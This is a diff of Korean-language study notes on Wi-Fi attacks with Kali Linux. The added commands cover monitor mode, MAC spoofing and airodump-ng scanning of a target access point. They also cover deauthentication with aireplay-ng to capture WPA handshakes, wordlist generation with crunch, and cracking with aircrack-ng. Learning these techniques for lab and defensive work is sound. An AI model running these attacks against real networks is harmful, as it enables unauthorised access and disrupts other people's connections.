@@ -7,11 +7,9 @@
   - `monitor` 모드 설정 가능
 - `Kali Linux` VM
 
-## Basics
+## Mode Switching
 
-### `managed` <-> `monitor` mode switching
-
-#### `managed` -> `monitor`
+### `managed` -> `monitor`
 
 ``` zsh
 ifconfig wlan0 down
@@ -19,7 +17,7 @@ iwconfig wlan0 mode monitor
 ifconfig wlan0 up
 ```
 
-#### `monitor` -> `managed`
+### `monitor` -> `managed`
 
 ``` zsh
 ifconfig wlan0 down
@@ -27,7 +25,7 @@ iwconfig wlan0 mode managed
 ifconfig wlan0 up
 ```
 
-### MAC Address Fabrication
+## MAC Address Fabrication
 
 ``` zsh
 ifconfig wlan0 down
@@ -37,32 +35,34 @@ ifconfig wlan0 up
 
 ## `airodump-ng`
 
+- 선행 조건
+  - monitor 모드 활성화 *(필수)*
+  - 5GHz 인식 가능한 무선 랜카드 *(필요 시)*
+
 ### Nontargeted
 
 #### `2.4GHz` Only
 
 ``` zsh
-# monitor 모드 활성화 필수
 airodump-ng wlan0
 ```
 
 #### `5GHz` Only
 
 ``` zsh
-# monitor 모드 활성화 필수
-# 5GHz 인식 가능 무선 랜카드 필수
 airodump-ng --band a wlan0
 ```
 
 #### `2.4GHz` & `5GHz`
 
 ``` zsh
-# monitor 모드 활성화 필수
-# 5GHz 인식 가능 무선 랜카드 필수
 airodump-ng --band abg wlan0
 ```
 
 ### Targeted
+
+- 선행 조건
+  - 공격 대상 AP의 `BSSID` 파악
 
 #### Scan Only
 
@@ -78,9 +78,10 @@ airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write test wlan0
 
 #### See log files
 
-``` zsh
-# press Ctrl+C and kill the airodump-ng scan
+press Ctrl+C and kill the airodump-ng scan
 
+``` zsh
+# home 경로 목록 확인
 ls
 
 # '-01'자가 붙어서 생성되는 파일들을 확인
@@ -88,23 +89,26 @@ ls
 # test-01.csv
 # test-01.kismet.csv
 # test-01.kismet.netxml
-
-# Wireshark
-wireshark
-# Wireshark GUI에서, [File] - [Open] - 'test-01.csv' 선택
 ```
+
+```zsh
+# Wireshark 열기
+wireshark
+```
+
+- `Wireshark`를 통한 `.cap` 분석하는 방법
+  1. `Wireshark` GUI
+  2. `File` - `Open`으로 창 열기
+  3. 파일 `test-01.csv` 선택
 
 #### Use `Wireshark`
-
-``` zsh
-# Wireshark
-wireshark
-# Wireshark GUI에서, [File] - [Open] - 'test-01.csv' 선택
-```
 
 ## Deauthentication Attack
 
 **약칭: `deauth`**
+
+- 선행 조건
+  - 공격 대상 AP의 `BSSID` 파악
 
 ### `deauth` Script
 
@@ -296,6 +300,11 @@ KEY FOUND! [ 5A:61:6B:6B:30 ] (ASCII: Zakk0 )
 
 ## WPA/WPA2
 
+- 도움되는 링크
+  - [DWPA](https://wpa-sec.stanev.org/)
+    - 분산형 `WPA handshake` 데이터베이스
+    - 공격에 필요한 **Wordlist 제공**
+
 ### Handshake Capturing
 
 ``` zsh
@@ -312,10 +321,34 @@ aireplay-ng --deauth 4 -a 00:99:88:77:66:55 -c 00:11:22:33:44:55 wlan0
 # ... 
 ```
 
+**주의: `WPA handshake` 로는 비밀번호 파악 불가!**
+대신, 비밀번호의 **일치/불일치 여부**만 파악 가능!
+
 ### Wordlist
 
-(작성 중)
+원리: Brute Force or Dictionary Attack
+
+`# crunch [min] [max] [characters] -t [pattern] -o [FileName]`
+
+- 설명
+  - `[min]`: 최소 문자 개수
+  - `[max]`: 최대 문자 개수
+  - `[characters]`: 조합 가능한 문자열 집합 (대소문자 구분)
+  - `-t [pattern]`: 고정할 패턴(조합을 원하는 부분은 `@`로 표시)
+  - `-o [FileName]`: `[FileName]`으로 문자열 리스트 저장
+
+``` zsh
+# 예시 1
+crunch 5 6 123ab -o wordlist_1.txt
+```
+
+``` zsh
+# 예시 2
+crunch 6 8 123abc$ -t a@@@@@b -o wordlist_2.txt
+```
 
 ### Wordlist Attack
 
-(작성 중)
+``` zsh
+aircrack-ng wpa_handshake-01.cap -w test.txt
+```
